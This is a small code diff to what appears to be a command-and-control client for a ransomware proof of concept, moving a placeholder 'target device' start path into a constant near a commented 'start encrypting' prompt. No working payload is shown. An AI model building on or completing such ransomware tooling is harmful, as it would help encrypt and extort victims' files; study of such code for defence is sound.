@@ -7,6 +7,8 @@ from subprocess import call
 from globals import update_existing_config
 from rwpoc import run
 
+TARGET_PATH = "<start-path-on-target-device>"
+
 
 def parse_args():
     parser = ArgumentParser(description='C2 Client')
@@ -65,7 +67,7 @@ if __name__ == "__main__":
     proc_config.start()
 
     try:
-        abs_paths = "<start-path-on-target-device>"
+        abs_paths = TARGET_PATH
 
         while True:
             # input("\nEnter: start encrypting")
